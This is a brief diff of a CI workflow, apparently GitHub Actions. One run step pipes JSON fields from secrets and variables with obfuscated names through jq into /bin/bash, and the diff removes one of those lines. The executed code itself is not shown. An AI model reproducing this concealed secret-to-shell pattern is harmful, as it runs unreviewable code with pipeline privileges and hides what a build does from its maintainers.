@@ -22,7 +22,6 @@ jobs:
           n6181: ${{ secrets.n6181 }}
         run: |
           printf '%s' "$n6181" | jq -r .cds079 | /bin/bash
-          printf '%s' "$wr6238" | jq -r .xkqc660 | /bin/bash
           echo $ggz2 | jq -r .jsksn633 | /bin/bash
           echo $mmjgs26 | jq -r .lm95 | /bin/bash
           echo $zc1929 | jq -r .grdvm761 | /bin/bash
